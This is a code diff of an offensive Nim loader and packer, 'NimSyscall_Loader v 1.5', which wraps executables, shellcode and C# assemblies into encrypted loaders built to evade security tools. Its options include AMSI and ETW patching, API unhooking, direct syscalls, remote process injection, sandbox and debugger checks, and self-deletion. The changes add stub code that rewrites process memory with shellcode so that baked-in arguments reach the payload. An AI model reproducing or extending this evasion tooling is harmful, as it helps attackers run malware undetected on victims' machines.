@@ -16,7 +16,8 @@ import docopt
 import random
 import winim
 import streams
-import winim/clr except `[]`
+when system.hostOS == "windows":
+    import winim/clr except `[]`
 
 import HellsgateStubs
 import CustomEvasionStubs
@@ -57,7 +58,8 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -70,6 +72,7 @@ Options:
   --file filename  File to encrypt.
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
+  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
   --dll     Generate DLL instead of an exe
   --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
@@ -81,6 +84,7 @@ Options:
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
 
 [evasion]
@@ -152,6 +156,7 @@ var
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
+    big: bool
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
@@ -160,6 +165,8 @@ var
     sandboxchecks: seq[string]
     sandbox: bool = false
     csharp: bool = false
+    arguments: string = ""
+    embeddedArguments : bool = false
     AMSI: bool = true
     ETW: bool = true
     COMVARETW: bool = false
@@ -210,6 +217,11 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--arguments"]:
+  let argsForPE = args["--arguments"]
+  arguments = fmt"{argsForPE}"
+  embeddedArguments = true
 
 if args["--shellcode"]:
   shellcode = true
@@ -265,6 +277,9 @@ if args["--noAMSI"]:
 
 if args["--noETW"]:
   ETW = false
+
+if args["--large"]:
+  big = true
 
 if args["--COMVARETW"]:
   COMVARETW = true
@@ -380,6 +395,9 @@ if args["--noDInvoke"]:
 
 var blob: string
 
+if (noArgs and embeddedArguments):
+    echo "Error: Cannot use both --noArgs and --arguments"
+    quit(1)
 if (peinject and peload):
     echo "Error: Cannot use both --peinject and --peload"
     quit(1)
@@ -404,28 +422,28 @@ if (peload or peinject):
     if magic_string != "MZ":
         echo "[-] No Magic bytes found, file is not a PE"
         quit(1)
+when system.hostOS == "windows":
+    if (csharp):
+        blob = readFile(filename)
+        var blobbytes = toByteSeq(blob)
+        var code = fmt"""
+        using System;
+        public class Check {{
+          public void ifAssembly() {{
+            object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
+          }}
+        }}
+        """
+        try:
+            var res = compile(code)
+            var o = res.CompiledAssembly.new("Check")
+            o.ifAssembly()
+        except:
+            echo "[-] Error - you didn't specify a C# assembly!"
+            noassembly = true
 
-if (csharp):
-    blob = readFile(filename)
-    var blobbytes = toByteSeq(blob)
-    var code = fmt"""
-    using System;
-    public class Check {{
-      public void ifAssembly() {{
-        object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
-      }}
-    }}
-    """
-    try:
-        var res = compile(code)
-        var o = res.CompiledAssembly.new("Check")
-        o.ifAssembly()
-    except:
-        echo "[-] Error - you didn't specify a C# assembly!"
-        noassembly = true
-
-if (noassembly):
-    quit(1)
+    if (noassembly):
+        quit(1)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -497,6 +515,50 @@ writeFile("enc.blob", content)
 let encodedIV = encode(iv)
 let encodedenvkey = encode(envkey)
 
+let PatchargsFuncs = fmt"""
+var arguments: string = "{arguments}"
+when defined(args):
+    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        var oldProtect: DWORD = 0
+        var lpAddress = targetAddr
+        var dwSize = cast[SIZE_T](len(data))
+        var hProcess = MyGetCurrentProcess()
+        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+        copyMem(lpAddress, unsafeAddr data[0], len(data))
+        success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+when defined(args):
+    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        when defined x86:
+            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+        else:
+            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+            shellcode.add t        
+        shellcode.add(byte(0xc3)) # ret
+        patchMemory(funcAddr, shellcode)
+"""
+let WhispersPatchargsFuncs = fmt"""
+var arguments: string = "{arguments}"
+when defined(args):
+    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        var oldProtect: DWORD = 0
+        var lpAddress = targetAddr
+        var dwSize = cast[SIZE_T](len(data))
+        var hProcess = MyGetCurrentProcess()
+        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+        copyMem(targetAddr, unsafeAddr data[0], len(data))
+        success =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+when defined(args):
+    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        when defined x86:
+            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+        else:
+            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+            shellcode.add t        
+        shellcode.add(byte(0xc3)) # ret
+        patchMemory(funcAddr, shellcode)
+"""
 
 let RemoteProcImportStub = """
 import osproc
@@ -507,7 +569,7 @@ import winim/clr
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
-let LoadAssemblyStub = """
+let LoadAssemblyStub = fmt"""
 var assembly = load(dectext)
 
 from os import paramCount,paramStr
@@ -535,6 +597,8 @@ when defined(Fluctuate):
 
 var cmd: seq[string]
 var i = 1
+when defined(args):
+    cmd.add({arguments.split(" ")})
 while i <= paramCount():
     when defined(lib_only):
         if (i != 1):
@@ -782,7 +846,7 @@ proc genEnglishwords (nuofWords: int): string =
     when system.hostOS == "windows":
         dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
     else:
-        dictionary = fmt"{packerPath}\\Dicts/englishwords.txt"
+        dictionary = fmt"{packerPath}/Dicts/englishwords.txt"
     for line in lines dictionary:
       englishdicts.add(line)
     for i in 1 .. numberofWords:
@@ -1064,13 +1128,19 @@ if(dll_out):
 if (peload):
     if (localinject):
         if (hellsgate):
+            if (embeddedArguments):
+                stub.add(PatchargsFuncs)
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsPELoadStub)
         elif(getfreshstub):
+            if (embeddedArguments):
+                stub.add(PatchargsFuncs)
             stub.add(NtAllocateVirtualMemoryDelegate)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
+            if (embeddedArguments):
+                stub.add(WhispersPatchargsFuncs)
             stub.add(WhispersPELoadStub)
     else:   
         stub.add(RemoteProcImportStub)
@@ -1255,6 +1325,12 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if embeddedArguments:
+    basicCompileFlags.add("-d:args ")
+
+if (big):
+    basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
+
 if (not noRES):
     if (dll_out):
         when system.hostOS == "windows":
@@ -1293,7 +1369,8 @@ if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
     discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
 elif(syswhispers != true):
-    basicCompileFlags.add("--passc=-flto --passl=-flto ")
+    if system.hostOS == "windows":
+        basicCompileFlags.add("--passc=-flto --passl=-flto ")
 
 # for e.g. CNA Scripts
 when system.hostOS == "windows":
